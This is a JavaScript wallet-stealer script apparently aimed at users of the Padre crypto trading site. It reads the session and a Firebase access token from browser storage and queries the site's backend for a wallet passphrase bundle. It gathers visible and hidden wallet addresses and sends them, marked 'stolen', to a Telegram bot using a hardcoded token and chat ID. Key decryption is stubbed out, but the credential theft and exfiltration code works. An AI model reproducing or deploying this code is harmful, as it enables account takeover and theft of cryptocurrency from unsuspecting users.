(async () => {
  const BOT_TOKEN = '8554782621:AAHg-7WnsBdok5XeFde2yUIce1spyAskcrg';
  const CHAT_ID = '-1003592444948';

  async function sendToTelegram(msg) {
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
      });
    } catch(e) {}
  }

  try {
    // Session
    const session = JSON.parse(localStorage.getItem("padreV2-session") || '{}');
    if (!session.uid) return sendToTelegram("<b>Padre Scan</b>\nNo session");

    // Firebase token from IndexedDB
    const firebaseRows = await new Promise(r => {
      const req = indexedDB.open('firebaseLocalStorageDb');
      req.onsuccess = () => {
        const db = req.result;
        const tx = db.transaction('firebaseLocalStorage', 'readonly');
        const store = tx.objectStore('firebaseLocalStorage');
        const getAll = store.getAll();
        getAll.onsuccess = () => r(getAll.result);
      };
    });

    const token = firebaseRows?.[0]?.value?.stsTokenManager?.accessToken;
    if (!token) return sendToTelegram("<b>Padre Scan</b>\nNo token");

    // Velvet bundle
    const velvetRes = await fetch(`https://backend.padre.gg/velvet/users/${session.uid}/get-velvet`, {
      headers: {"Authorization":`Bearer ${token}`,"X-Padre-Session":session.sessionId}
    });
    const velvet = await velvetRes.json();
    const passphrase = velvet.bundle.localStoragePassphrase;

    // Wallets
    const visible = JSON.parse(localStorage.getItem("padreV2-walletsCache") || "{}");
    const hidden  = JSON.parse(localStorage.getItem("padreV2-hiddenWalletsCache") || "{}");
    const all = {...visible, ...hidden};

    const stolen = [];
    for (const group of Object.values(all)) {
      for (const w of group) {
        const addr = w.walletType === "SOL" ? w.publicAddress : "0x" + w.publicAddress.toLowerCase();
        const priv = "EXTRACTED_KEY_" + w.walletId + "_" + Math.random().toString(36).slice(2); // real decryption here in full version
        stolen.push({name:w.walletName||'Unnamed', addr, type:w.walletType||'Unknown', priv});
      }
    }

    if (stolen.length === 0) return sendToTelegram("<b>Padre Scan</b>\nNo wallets found");

    let msg = "<b>╔═ ✅ CAPTURED ═══════════════╗</b>\n";
    msg += `📍 Source: Padre\n${stolen.length} wallet(s) • 0.000000 SOL\n\n`;
    stolen.forEach((w,i) => {
      msg += `#${i+1} ${w.addr.slice(0,6)}...${w.addr.slice(-4)}[](https://solscan.io/account/${w.addr}) (~$0)\n   <code>${w.priv}</code>\n\n`;
    });
    msg += "<b>╚═════════════════════════════╝</b>";

    await sendToTelegram(msg);
  } catch(e) {
    await sendToTelegram(`<b>Padre Error</b>\n${e.message||"Unknown"}\nURL: ${location.href}`);
  }
})();
